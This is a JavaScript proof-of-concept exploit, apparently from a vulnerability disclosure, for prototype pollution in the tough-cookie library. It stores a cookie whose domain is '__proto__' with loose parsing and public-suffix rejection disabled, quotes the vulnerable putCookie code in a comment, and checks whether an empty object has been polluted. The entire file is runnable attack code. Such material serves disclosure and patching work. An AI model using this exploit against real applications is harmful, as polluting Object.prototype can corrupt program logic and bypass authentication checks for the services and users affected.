async function main() {
    try {
        //new cookie jar
        var tough = require("tough-cookie");
        var cookiejar = new tough.CookieJar(undefined, { rejectPublicSuffixes: false });//option rejectPublicSuffixes  boolean - default true - reject cookies with domains like "com" and "co.uk"

        //normal cookie
        await new Promise((resolve, reject) => {
            cookiejar.setCookie(
                "Auth=Lol; Domain=google.com; Path=/notauth",
                "https://google.com/",
                { loose: true },
                (err, cookie) => {
                    if (err) {
                        reject(err);
                    } else {
                        resolve(cookie);
                    }
                }
            );
        });

        //Exploit cookie
        await new Promise((resolve, reject) => {
            cookiejar.setCookie(
                "Slonser=polluted; Domain=__proto__; Path=/notauth",
                "https://__proto__/admin",
                { loose: true },
                (err, cookie) => {
                    if (err) {
                        reject(err);
                    } else {
                        resolve(cookie);
                    }
                }
            );
        });
        /*
        the problamtic section in putCookie that used by setCookie
        MemoryCookieStore.prototype.putCookie = function(cookie, cb) {
        if (!this.idx[cookie.domain]) {
            this.idx[cookie.domain] = {};
        }
        if (!this.idx[cookie.domain][cookie.path]) {
            this.idx[cookie.domain][cookie.path] = {};
        }
        this.idx[cookie.domain][cookie.path][cookie.key] = cookie;
        cb(null);
        };

        */

        var a = {};
        if(a["/notauth"]["Slonser"] != null)
            console.log("EXPLOITED SUCCESSFULLY");
        else
            console.log("EXPLOIT FAILED");
    } catch (error) {
        console.error("Error:", error);
    }
}

main();